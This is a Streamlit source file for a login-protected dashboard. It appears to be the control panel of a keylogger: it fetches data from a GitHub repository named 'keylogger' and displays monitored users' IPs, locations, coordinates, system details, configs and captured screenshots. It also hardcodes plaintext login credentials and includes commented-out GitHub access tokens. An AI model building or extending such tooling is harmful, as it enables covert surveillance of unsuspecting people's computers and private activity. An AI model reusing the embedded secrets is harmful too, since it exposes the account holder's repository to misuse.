# user loging
import re
import ast
import json
import hashlib
import requests
import pandas as pd 
import streamlit as st
from io import BytesIO
import plotly.express as px
from datetime import datetime, timedelta
from streamlit_image_zoom import image_zoom


# Your GitHub Personal Access Token
DATA_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/activeuserinfo.txt"
SCREENSHOT_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots"
SCREENSHOT_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/screenshots/"
CONFIG_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
CONFIG_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/config/"

# Use Streamlit secrets for GitHub token
GITHUB_TOKEN = st.secrets["GITHUB_TOKEN"]

# GITHUB_TOKEN = "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"
# GITHUB_TOKEN = st.secrets["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"]
last_line = 10 # Number of lines to fetch
cache_time = 1  # Cache time in seconds
last_screenshot = 30  # Number of screenshots to fetch
last_config = 30  # Number of config files to fetch


# Encrypted username and password
USERNAME_HASH = hashlib.sha256("bibek48".encode()).hexdigest()
PASSWORD_HASH = hashlib.sha256("adminbibek".encode()).hexdigest()

# Function to validate login credentials
def authenticate_user(username, password):
    username_encrypted = hashlib.sha256(username.encode()).hexdigest()
    password_encrypted = hashlib.sha256(password.encode()).hexdigest()
    return username_encrypted == USERNAME_HASH and password_encrypted == PASSWORD_HASH

# Function to fetch the last 10 lines from the private repository
@st.cache_data(ttl=cache_time)
def fetch_last_10_lines_private(url, token):
    headers = {
        "Authorization": f"token {token}"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        lines = response.text.strip().split("\n")
        return lines[-last_line:]  # Return the last 10 lines
    except requests.RequestException as e:
        st.error(f"Failed to fetch data: {e}")
        return []

# Function to safely parse System Info
def preprocess_system_info(system_info_str):
    """
    Preprocesses the system info string by replacing unsupported objects (like sdiskpart)
    with a placeholder or simplified representation.
    """
    system_info_str = re.sub(r"sdiskpart\(.*?\)", "'Disk Partition'", system_info_str)  # Replace sdiskpart objects
    try:
        system_info = ast.literal_eval(system_info_str)
    except Exception as e:
        st.warning(f"Error parsing System Info: {e}")
        system_info = {"Error": "Unable to parse System Info"}
    return system_info

# Function to parse active user info
def parse_active_user_info(lines):
    active_user_data = []
    for line in lines:
        match = re.search(r"User: (?P<username>.*?), Unique_ID: (?P<Unique_ID>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?), Postal: (?P<Postal>.*?),", line
        )
        if match:
            user_data = match.groupdict()
            # Combine username and Unique_ID into a single field
            # user_data["username"] = f"{user_data['username']}_{user_data['Unique_ID']}"
            # active_user_data.append(user_data)
            
            # Extract the first two characters of the location
            location_prefix = user_data["location"][:2]
            # Combine location prefix, username, and Unique_ID into the user field
            user_data["username"] = f"{user_data['username']}_{location_prefix}_{user_data['Unique_ID']}"
            active_user_data.append(user_data)
    return active_user_data


# Function to parse user info
# def parse_user_info(lines):
#     user_data = []
#     for line in lines:
#         # Extract the timestamp
#         timestamp_match = re.search(r"^(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})", line)
#         username_match = re.search(r"User: (?P<username>[^\s,]+)", line)
#         ip_match = re.search(r"IP: (?P<ip>[^\s,]+)", line)
#         location_match = re.search(r"Location: (?P<location>[^,]+(?:, [^,]+)+)", line)
#         org_match = re.search(r"Org: (?P<org>[^,]+)", line)
#         coordinates_match = re.search(r"Coordinates: (?P<coordinates>[^\s,]+)", line)
#         system_info_match = re.search(r"System Info: (?P<system_info>\{.*\})", line)

#         if username_match and ip_match:
#             user_info = {
#                 "timestamp": timestamp_match.group("timestamp") if timestamp_match else "N/A",
#                 "username": username_match.group("username"),
#                 "ip": ip_match.group("ip"),
#                 "location": location_match.group("location") if location_match else "Unknown",
#                 "org": org_match.group("org") if org_match else "Unknown",
#                 "coordinates": coordinates_match.group("coordinates") if coordinates_match else "Unknown",
#             }
#             # Parse system info safely
#             if system_info_match:
#                 try:
#                     user_info["system_info"] = eval(system_info_match.group("system_info"), {"sdiskpart": dict})
#                 except Exception:
#                     user_info["system_info"] = {}

#             user_data.append(user_info)

#     return user_data

def parse_user_info(lines):
    user_data = []
    for line in lines:
        user_info = {}
        user_info["raw"] = line
        
        timestamp_match = re.match(r"^(?P<timestamp>[\d-]+ [\d:]+) -", line)
        if timestamp_match:
            user_info["timestamp"] = timestamp_match.group("timestamp")
            
        match = re.search(
            r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?),",
            line
        )
        if match:
            user_info.update(match.groupdict())
            
            # Add location prefix to the user field
            location_prefix = user_info["location"][:2]  # Extract first 2 characters of location
            user_info["username"] = f"{location_prefix}_{user_info['username']}"  # Add location prefix to username
        
        # Extract system info details
        system_info_match = re.search(r"System Info: (?P<system_info>{.*})", line)
        if system_info_match:
            system_info_str = system_info_match.group("system_info")
            user_info["system_info"] = preprocess_system_info(system_info_str)
        
        user_data.append(user_info)
    return user_data


# Function to fetch config file details from the private repository
@st.cache_data(ttl=cache_time)
def fetch_config_files():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        response = requests.get(CONFIG_API_URL, headers=headers)
        response.raise_for_status()
        file_list = response.json()[:-last_config]  # Fetch last 30 files
        config_data = []
        for file in file_list:
            filename = file["name"]
            if filename.endswith("_config.json"):
                try: # 20250123_142553_dsah8_config.json
                    parts = filename.split("_")
                    user = parts[2] + parts[3]
                    timestamp = datetime.strptime(parts[0] + parts[1], "%Y%m%d%H%M%S")
                    url = file["download_url"]  # Use the raw URL for downloading content
                    config_data.append({"user": user, "timestamp": timestamp, "url": url})
                except Exception as e:
                    st.error(f"Error parsing filename: {filename}. {e}")
        return config_data
    except requests.RequestException as e:
        st.error(f"Failed to fetch data from GitHub API: {e}")
        return []


# Function to display config data
def display_config_data(config_data, selected_user):
    st.subheader("Config File Viewer")

    if selected_user == "All Active":
        # Show the latest config.json for each user
        latest_configs = {}
        for config in config_data:
            if config["user"] not in latest_configs:
                latest_configs[config["user"]] = config
            elif config["timestamp"] > latest_configs[config["user"]]["timestamp"]:
                latest_configs[config["user"]] = config
        
        for user, config in latest_configs.items():
            st.write(f"**User:** {user}, **Timestamp:** {config['timestamp']}")
            response = requests.get(config["url"])
            if response.status_code == 200:
                st.json(response.json(), expanded=False)
            else:
                st.error(f"Failed to fetch config for user {user}.")
    else:
        # Show only the latest config.json for the selected user
        user_configs = [c for c in config_data if c["user"] == selected_user]
        if user_configs:
            latest_config = sorted(user_configs, key=lambda x: x["timestamp"], reverse=True)[0]
            st.write(f"**User:** {selected_user}, **Timestamp:** {latest_config['timestamp']}")
            response = requests.get(latest_config["url"])
            if response.status_code == 200:
                st.json(response.json(), expanded=True)
            else:
                st.error(f"Failed to fetch config for user {selected_user}.")
        else:
            st.error(f"No config files found for user: {selected_user}")


# Authenticate GitHub API
def authenticate_github():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    return headers

# Fetch the last 30 screenshots from the GitHub API
@st.cache_data(ttl=cache_time)  # Cache for 5 minutes
def fetch_screenshots():
    headers = authenticate_github()
    try:
        response = requests.get(SCREENSHOT_API_URL, headers=headers)
        response.raise_for_status()
        files = response.json()
        screenshots = []
        for file in files[-last_screenshot:]:  # Fetch only the last 30 screenshots
            if file["name"].endswith(".png"):
                try: 
                    # 20250123_141302_bibek_screenshot_2025-01-23_14-12-19.png
                    # 20250125_124537_bibek_4C4C4544-0033-3910-804A-B3C04F324233_screenshot_2025-01-25_12-45-12.png
                    # Split the filename to extract details
                    name_parts = file["name"].split("_")
                    if len(name_parts) < 3:  # Ensure enough parts for parsing
                        st.warning(f"Skipping improperly formatted file: {file['name']}")
                        continue
                    date_time = name_parts[0] + name_parts[1]  # YYYYMMDD + HHMMSS
                    # user = name_parts[2]  # Extract user name
                    user = name_parts[2]+ name_parts[3]  # Extract user name
                    date_time = name_parts[0] + name_parts[1]  # Combine YYYYMMDD and HHMMSS
                    timestamp = datetime.strptime(date_time, "%Y%m%d%H%M%S")  # Parse into a datetime object
                    screenshots.append({
                        "name": file["name"],
                        "url": file["download_url"],
                        "user": user,
                        "timestamp": timestamp,
                    })
                except ValueError:
                    st.warning(f"Unable to parse filename: {file['name']}")
        return sorted(screenshots, key=lambda x: x["timestamp"], reverse=True)
    except requests.RequestException as e:
        st.error(f"Failed to fetch screenshot data: {e}")
        return []

# Download an image from a URL
def download_image(url):
    headers = authenticate_github()
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return BytesIO(response.content)  # Return image as BytesIO object
    else:
        return None


# Function to check for new screenshots
@st.cache_data(ttl=10)  # Refresh every 10 seconds
def check_new_screenshots(latest_timestamp):
    current_screenshots = fetch_screenshots()
    latest = max([s["timestamp"] for s in current_screenshots])
    return latest > latest_timestamp, current_screenshots



# Function to fetch the last 10 lines from the private repository
# Function to detect anomalies in user activity
def detect_anomalies(user_data):
    anomalies = []
    for user in user_data:
        # Example anomaly check: Unexpected location
        expected_location = "USA"  # Replace with user-specific location data
        if user["location"] != expected_location:
            anomalies.append({
                "user": user["username"],
                "reason": f"Unexpected location: {user['location']}"
            })
    return anomalies


# Function to filter screenshots based on user and date range
def filter_screenshots(screenshot_data, user, start_date, end_date):
    filtered_screenshots = [
        screenshot for screenshot in screenshot_data
        if (user == "All Users" or screenshot["user"] == user) and
           (start_date <= screenshot["timestamp"].date() <= end_date)
    ]
    return filtered_screenshots


# Function to get unique users
def get_unique_users(user_data):
    seen_users = set()
    unique_users = []
    for user in user_data:
        if user["username"] not in seen_users:
            seen_users.add(user["username"])
            unique_users.append(user)
    return unique_users

# Main Dashboard App
def dashboard():
    
    st.title("Detailed Active User Activity Dashboard")
    st.write("Explore detailed information of active users.")

    # Fetch and parse the data
    lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
    user_data = parse_user_info(lines)
    active_user_data = parse_active_user_info(lines)
    screenshot_data = fetch_screenshots()
    
    st.sidebar.header("Active User Activity Dashboard")

    if user_data:
        # Get unique users
        unique_users = get_unique_users(user_data)
        user_list = ["All"] + [user["username"] for user in unique_users]  # Add "All" for default option
        # Sidebar to select a user
        selected_user = st.sidebar.selectbox("Select a User", user_list)

        # Filter data based on selection
        if selected_user != "All":
            filtered_users = [user for user in unique_users if user["username"] == selected_user]
        else:
            filtered_users = unique_users  # Only show unique users        
        
        # Title and "Update Dashboard" Button
        col1, col2 = st.columns([8, 1])  # Adjust column widths as needed
        with col1:
            st.title(f"Active Users: {len(filtered_users)}")
        with col2:
            if st.button("Update Dashboard"):
                fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
                
        # Streamlit app
        # st.title("Active Users")
        st.write("Dashboard showing unique active users and their details.")
        # Convert to DataFrame for display
        df = pd.DataFrame(active_user_data).drop_duplicates(subset="username")
        st.table(df)  # Display as a table

        # Fetch data from the URL
        @st.cache_data(ttl=cache_time)  # Cache the data for 60 seconds to avoid frequent network calls
        def fetch_data_from_url():
            import requests
            response = requests.get(DATA_URL)
            if response.status_code == 200:
                lines = response.text.strip().split("\n")[-last_line:]  # Get the last 10 lines
                return parse_user_info(lines)
            else:
                st.error("Failed to fetch data from the URL.")
                return []


        # Create a DataFrame for visualizations
        df = pd.DataFrame(filtered_users)
        df["city"] = df["location"].apply(lambda loc: loc.split(",")[1].strip() if "," in loc else "Unknown")
        df["country"] = df["location"].apply(lambda loc: loc.split(",")[0].strip() if "," in loc else "Unknown")
        
        # Display details of filtered users (details of active user)
        st.title("Active User Dashboard")
        st.write(f"### Active Users: {len(filtered_users)}")
        for user in filtered_users:
            # Use the extracted timestamp
            # timestamp = user["timestamp"]
            
            # with st.expander(f"Details for User: {user['username']} (IP: {user['ip']}, Last Active: {timestamp})"):
            with st.expander(f"Details for User: {user['username']} (Last Active: {user['timestamp']})"):
                st.write(f"**Timestamp:** {user.get('timestamp', 'N/A')}")
                st.write(f"**Location:** {user['location']}")
                st.write(f"**Organization:** {user['org']}")
                st.write(f"**Coordinates:** {user['coordinates']}")
                
                # Display System Info in a table
                if "system_info" in user:
                    system_info_df = pd.DataFrame(
                        user["system_info"].items(), columns=["Property", "Value"]
                    )
                    st.write("### System Info:")
                    st.table(system_info_df)
        
        # Add Visualization for Country/City Distribution
        st.write("## User Distribution by Country and City")
        
        # Bar Chart for Countries
        country_counts = df["country"].value_counts().reset_index()
        country_counts.columns = ["Country", "Count"]
        st.write("### Country Distribution")
        country_chart = px.bar(country_counts, x="Country", y="Count", title="Active Users by Country")
        st.plotly_chart(country_chart, use_container_width=True)

        # Bar Chart for Cities
        city_counts = df["city"].value_counts().reset_index()
        city_counts.columns = ["City", "Count"]
        st.write("### City Distribution")
        city_chart = px.bar(city_counts, x="City", y="Count", title="Active Users by City")
        st.plotly_chart(city_chart, use_container_width=True)
        
        st.title("Active User Dashboard with Config Viewer")
        # Sidebar user selection
        config_data = fetch_config_files()
        unique_users = ["All Active"] + sorted(set([c["user"] for c in config_data]))
        selected_user = st.sidebar.selectbox("Select User (Config)", unique_users)
        # Display Config Data
        display_config_data(config_data, selected_user)

        
        # Extract unique usernames from the screenshot data
        unique_users_screenshot = list({s["user"] for s in screenshot_data})  # Set to remove duplicates, then convert to list
        unique_users_screenshot.sort()  # Optional: Sort usernames alphabetically
        # Add "All Users" as the first option
        unique_users_screenshot.insert(0, "All Users")
        # Sidebar for user selection
        selected_user = st.sidebar.selectbox("Select User (Screenshot)", unique_users_screenshot)
        
        
        # Add custom CSS for overlaying the download button
        st.markdown(
            """
            <style>
            .image-container {
                position: relative;
                display: inline-block;
            }
            .download-button {
                position: absolute;
                top: 10px;
                right: 10px;
                background-color: rgba(255, 255, 255, 0.8);
                padding: 5px;
                border-radius: 50%;
                box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.2);
            }
            .download-button img {
                width: 25px;
                height: 25px;
            }
            </style>
            """,
            unsafe_allow_html=True,
        )
        
        st.write("## User Latest Screenshots")
        # Display the latest screenshot for the selected user
        if selected_user == "All Users":
            # Show the latest screenshot for each user
            latest_screenshots = {}
            for s in screenshot_data:
                if s["user"] not in latest_screenshots:
                    latest_screenshots[s["user"]] = s
            for screenshot in latest_screenshots.values():
                # st.image(screenshot["url"], caption=f"{screenshot['user']} - {screenshot['timestamp']},")
                st.image(
                    screenshot["url"], 
                    caption=f"{screenshot['user']} @ {screenshot['timestamp']} 👉 {screenshot['name']}",
                    use_container_width=True,
                )
                st.download_button(
                    label="Download ☝️",
                    data=requests.get(screenshot["url"]).content,  # Fetch and prepare image data
                    file_name=screenshot["name"],
                    mime="image/png"
                )
        else:
            # Show only the latest screenshot for the selected user
            user_screenshots = [s for s in screenshot_data if s["user"] == selected_user]
            # Sort screenshots by timestamp to get the latest one
            latest_screenshot = sorted(user_screenshots, key=lambda x: x["timestamp"], reverse=True)[0]
            # Display the latest screenshot
            # st.image(latest_screenshot["url"], caption=f"{selected_user} - {latest_screenshot['timestamp']}")
            st.image(
                latest_screenshot["url"], 
                caption=f"{selected_user} @ {latest_screenshot['timestamp']} 👉 {latest_screenshot['name']}",
                use_container_width=True,
            )
            st.download_button(
                label="Download ☝️",
                data=requests.get(screenshot["url"]).content,  # Fetch and prepare image data
                file_name=screenshot["name"],
                mime="image/png"
            )
        
        # Check for new screenshots
        new_screenshots, current_screenshots = check_new_screenshots(screenshot_data[0]["timestamp"])
        if new_screenshots:
            st.warning("🚨 New screenshots detected! Please refresh the page to view the latest screenshots."
                       " Click the 'Update Data' button in the sidebar to refresh the data.")
        
           
            
        # # Display the last 30 screenshots
        # # Add a checkbox in the sidebar
        # show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
        # # Display the last 30 screenshots (conditionally based on the sidebar checkbox)
        # st.title("Recent Screenshots")
        # if show_screenshots:  # Only execute this block if the checkbox is checked
        #     for screenshot in screenshot_data:
        #         if selected_user == "All Users" or screenshot["user"] == selected_user:
        #             st.image(
        #                 download_image(screenshot["url"]),  # Function to fetch the image
        #                 caption=screenshot["name"],  # Display the filename as the caption
        #                 use_container_width=True  # Adjust to fit container width
        #             )
        
        
        
        
        # Initialize latest timestamp
        if "latest_timestamp" not in st.session_state:
            st.session_state.latest_timestamp = datetime.min
        # Check for new screenshots
        has_new_data, updated_screenshot_data = check_new_screenshots(st.session_state.latest_timestamp)
        # Display alert if new data is available
        if has_new_data:
            st.session_state.latest_timestamp = max([s["timestamp"] for s in updated_screenshot_data])
            st.sidebar.warning("🔔 New screenshots/logs detected! Refresh to view them.")
        # Button to refresh manually
        if st.sidebar.button("Refresh Now"):
            fetch_screenshots.clear()  # Clear cache for this function
            
            if "refresh_needed" not in st.session_state:
                st.session_state.refresh_needed = False
            if st.session_state.refresh_needed:
                # Fetch new data or rerun parts of your logic here
                st.write("Data has been refreshed!")
                st.session_state.refresh_needed = False
        
        
        # Display anomalies (if any restricted country detected)
        anomalies = detect_anomalies(user_data)
        # Display anomalies in a table
        if anomalies:
            st.warning("⚠️🚨 Anomalies detected in user activity:")
            for anomaly in anomalies:
                st.write(f"**User:** {anomaly['user']}, **Reason:** {anomaly['reason']}")
        else:
            st.success("✅ No anomalies detected.")
            
        
        # Display the last 30 screenshots
        # Sidebar filters
        show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
        if show_screenshots:
            st.title("Screenshot Gallery")

            # User filter
            users = ["All Users"] + sorted(set(s["user"] for s in screenshot_data))
            selected_user = st.sidebar.selectbox("Select User", users)

            # Date filter
            start_date = st.sidebar.date_input("Start Date", value=datetime.now().date())
            end_date = st.sidebar.date_input("End Date", value=datetime.now().date())

            # Filter screenshots
            filtered_screenshots = filter_screenshots(screenshot_data, selected_user, start_date, end_date)

            # Display screenshots in a gallery layout
            col1, col2, col3 = st.columns(3)
            for i, screenshot in enumerate(filtered_screenshots):
                col = [col1, col2, col3][i % 3]
                with col:
                    st.image(
                        download_image(screenshot["url"]),
                        caption=f"{screenshot['user']} - {screenshot['timestamp']}",
                        use_container_width=True
                    )
        
        
        # Add a button to update the data
        st.sidebar.button("Update Data", on_click=fetch_last_10_lines_private, args=(DATA_URL, GITHUB_TOKEN))
        st.sidebar.button("Update Config Files", on_click=fetch_config_files)
        st.sidebar.button("Update Screenshots", on_click=fetch_screenshots)
        
        

        st.sidebar.markdown("---")  # Add a separator
        st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")
        
    else:
        st.warning("No user data found!")

# Streamlit app
st.set_page_config(page_title="Active User Dashboard", layout="wide", page_icon=":computer:")



# Login Functionality
def login():
    st.title("Login to the Dashboard")
    st.write("Please enter your credentials to access the dashboard.")

    # Login form
    with st.form("login_form"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            if authenticate_user(username, password):
                st.session_state["authenticated"] = True
                st.success("Login successful! Redirecting...")
            else:
                st.error("Invalid username or password.")

# Main app logic
if "authenticated" not in st.session_state:
    st.session_state["authenticated"] = False

if not st.session_state["authenticated"]:
    login()
else:
    dashboard()


# Custom footer
import datetime
current_year = datetime.datetime.now().year
st.markdown(f"""
    <hr>
    <footer style='text-align: center;'>
        © {current_year} Active User Dashboard | Developed by <a href='https://bibekchandsah.com.np' target='_blank' style='text-decoration: none; color: inherit;'>Bibek Chand Sah</a>
    </footer>
""", unsafe_allow_html=True)

















# import re
# import ast
# import requests
# import pandas as pd
# import streamlit as st

# # Your GitHub Personal Access Token
# GITHUB_TOKEN = "add_your_token_here"
# DATA_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/activeuserinfo.txt"
# last_line = 10


# # show unique user details
# # Function to fetch the last 10 lines from the private repository
# def fetch_last_10_lines_private(url, token):
#     headers = {
#         "Authorization": f"token {token}"
#     }
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         lines = response.text.strip().split("\n")
#         return lines[-last_line:]  # Return the last 10 lines
#     else:
#         st.error(f"Failed to fetch data: {response.status_code} - {response.reason}")
#         return []

# # Function to parse user info
# def parse_user_info(lines):
#     user_data = []
#     for line in lines:
#         match = re.search(r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?), Postal: (?P<Postal>.*?),", line)
#         if match:
#             user_data.append(match.groupdict())
#     return user_data

# # Function to update the dashboard
# def update_dashboard():
#     lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
#     user_data = parse_user_info(lines)

#     if user_data:
#         # Convert to DataFrame for display
#         df = pd.DataFrame(user_data).drop_duplicates(subset="username")
#         st.table(df)  # Display as a table
#     else:
#         st.warning("No active user data found!")
 
# # Streamlit app
# st.title("User Active Dashboard")
# st.write("Dashboard showing unique active users and their details from the last 10 log entries.")

# # Auto-refresh manually
# if st.button("Update Dashboard"):
#     update_dashboard()
















# # unique user data and specific data
# # Function to fetch the last 10 lines from the private repository
# def fetch_last_10_lines_private(url, token):
#     headers = {
#         "Authorization": f"token {token}"
#     }
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         lines = response.text.strip().split("\n")
#         return lines[-last_line:]  # Return the last 10 lines
#     else:
#         st.error(f"Failed to fetch data: {response.status_code} - {response.reason}")
#         return []

# # Function to safely parse System Info
# def preprocess_system_info(system_info_str):
#     """
#     Preprocesses the system info string by replacing unsupported objects (like sdiskpart)
#     with a placeholder or simplified representation.
#     """
#     system_info_str = re.sub(r"sdiskpart\(.*?\)", "'Disk Partition'", system_info_str)  # Replace sdiskpart objects
#     try:
#         system_info = ast.literal_eval(system_info_str)
#     except Exception as e:
#         st.warning(f"Error parsing System Info: {e}")
#         system_info = {"Error": "Unable to parse System Info"}
#     return system_info

# # Function to parse user info
# def parse_user_info(lines):
#     user_data = []
#     for line in lines:
#         user_info = {}
#         user_info["raw"] = line
#         user_info.update(re.search(
#             r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?),",
#             line
#         ).groupdict())
        
#         # Extract system info details
#         system_info_match = re.search(r"System Info: (?P<system_info>{.*})", line)
#         if system_info_match:
#             system_info_str = system_info_match.group("system_info")
#             user_info["system_info"] = preprocess_system_info(system_info_str)
        
#         user_data.append(user_info)
#     return user_data

# # Function to get unique users
# def get_unique_users(user_data):
#     seen_users = set()
#     unique_users = []
#     for user in user_data:
#         if user["username"] not in seen_users:
#             seen_users.add(user["username"])
#             unique_users.append(user)
#     return unique_users

# # Streamlit app to display detailed user info
# st.title("Detailed User Activity Dashboard")
# st.write("Explore detailed information of active users in the last 10 logs.")

# # Fetch and parse the data
# lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
# user_data = parse_user_info(lines)

# if user_data:
#     # Get unique users
#     unique_users = get_unique_users(user_data)
#     user_list = ["All"] + [user["username"] for user in unique_users]  # Add "All" for default option

#     # Sidebar to select a user
#     selected_user = st.sidebar.selectbox("Select a User", user_list)

#     # Filter data based on selection
#     if selected_user != "All":
#         filtered_users = [user for user in unique_users if user["username"] == selected_user]
#     else:
#         filtered_users = unique_users  # Only show unique users

#     # Display details of filtered users
#     st.write(f"### Active Users: {len(filtered_users)}")
#     for user in filtered_users:
#         with st.expander(f"Details for User: {user['username']} (IP: {user['ip']})"):
#             st.write(f"**Location:** {user['location']}")
#             st.write(f"**Organization:** {user['org']}")
#             st.write(f"**Coordinates:** {user['coordinates']}")
            
#             # Display System Info in a table
#             if "system_info" in user:
#                 system_info_df = pd.DataFrame(
#                     user["system_info"].items(), columns=["Property", "Value"]
#                 )
#                 st.write("### System Info:")
#                 st.table(system_info_df)
# else:
#     st.warning("No user data found!")








